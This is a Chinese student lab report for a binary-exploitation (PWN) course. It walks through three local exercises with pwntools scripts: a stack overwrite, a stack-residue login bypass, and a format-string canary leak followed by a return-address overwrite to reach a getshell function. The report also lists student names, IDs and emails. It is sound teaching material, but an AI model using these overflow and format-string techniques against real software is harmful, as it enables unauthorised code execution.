[TOC]

# <center>《网络攻防实战》实验报告</center>

### **PWN第一次作业**

### 小组成员姓名：金宇航、成浩鹏

### 小组成员学号：181250062、181250020

### 18级软件学院大一班

### 小组成员邮箱：181250062@smail.nju.edu.cn、181250020@smail.nju.edu.cn

### 时间：2019.12.10

---

## 一、 实验目的

1. IDA
2. GDB
3. PWNTOOLS

## 二、 实验内容

### ex1

1. 通过IDA看到需要填一个整型和一个双精度实数分别为0xdeadbeef和3.14

2. 这两个变量分别位于[esp+4h]和[esp+8h]

3. 通过gdb得到3.14在内存中存储为0x40091eb851eb851f

4. 用'a'填充20个字符中前后的空位，中间填整数和实数

5. ```python
   from pwn import *
   sh = process("./ex1")
   sh.sendline("a" * 4 + p32(0xdeadbeef) + p64(0x40091eb851eb851f) + "a" * 4)
   sh.interactive()
   ```

### ex2

1. 通过作业说明知道了需要利用栈残留，就在login中的输入部分分别输入`ABCDEFGHIJKLMNOPQRS\n`和`abcdefghijklmno\n`

2. 在gdb中观察，执行到verify函数中时，`IJab`会和`root`比较，`BCDEFGH`会和`Trinity`比较，就在输入的字符串中做相应的修改

3. ```python
   from pwn import *
   sh = process("./ex2")
   sh.sendline("ATrinityroKLMNOPQRS\notcdefghijklmno\n")
   sh.interactive()
   ```

### ex3

1. 通过IDA和gdb知道代码原有的canary是0xDEADBEEF，gcc自带的canary的地址就在原有canary之后，再之后的8个字节为数据，然后4个字节是ebp，再4个字节是函数的返回地址

2. 通过GDB获取并计算，main-getshell=0x166

3. ```python
   from pwn import *
   sh = process("./ex3")
   ```

4. 先用printf获取内存里的值

   ```python
   sh.send("%p" * 50)
   sh.recv()
   ```

   > Hello, I\'m compiled with "-fstack-protector -fPIE -pie -z noexecstack". I\'m very secure!\nShhhhh, my canary is sleeping...\n0xff9b1df40x2000x565c82bd(nil)0x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70257025**0xdeadbeef0x1815d3000x565c90a80x565cb0000xff9b1e780x565c83a5**0xff9b1e90(nil)(nil)0xf7d9a7e10xf7f530000xf7f53000(nil)0xf7d9a7e10x10xff9b1f240xff9b1f2c0xff9b1eb40x1(nil)0xf7f53000\xef\xbe\xad\xde

5. 发现其中有0xdeadbeef，也就知道了1中提到的东西。函数的返回地址，减去0x166就是getshell中某个指令的地址。依次填充完s的100个字节，然后填0xdeadbeef，gcc的canary（0x1815d300），不需要处理的数据（0x565c90a80x565cb000），不需要修改的ebp（0xff9b1e78），最后是getshell的地址（0x565c83a5-0x166=0x565c823f）

   ```
   sh.send("a" * 100 + p32(0xdeadbeef) + p32(0x1815d300) + p32(0x565c90a8) + p32(0x565cb000) + p32(0xff9b1e78) + p32(0x565c823f))
   ```

6. 最后`sh.interactive()`进入shell，但是没有看到`Congratulations! Here is the gift:`

7. 0x166是main和getshell之间的距离，而通过4得到的函数返回地址比main要大，所以5中就从获取shell开始执行，跳过了之前打印字符的指令。所以要精确地定位到getshell的头部，还需要在减去0x166的基础上再减去0x36就是getshell的起始位置了

## 三、 实验结果

获得三个`Congratulations`

## 四、 实验中遇到的问题及解决方案

无

## 五、 组员分工

无

## 六、 实验的启示/意见和建议

---

附：本次实验你总共用了多长时间？包括学习相关知识时间、完成实验内容时间、完成实验报告时间。（仅做统计用，时间长短不影响本次实验的成绩。）

1天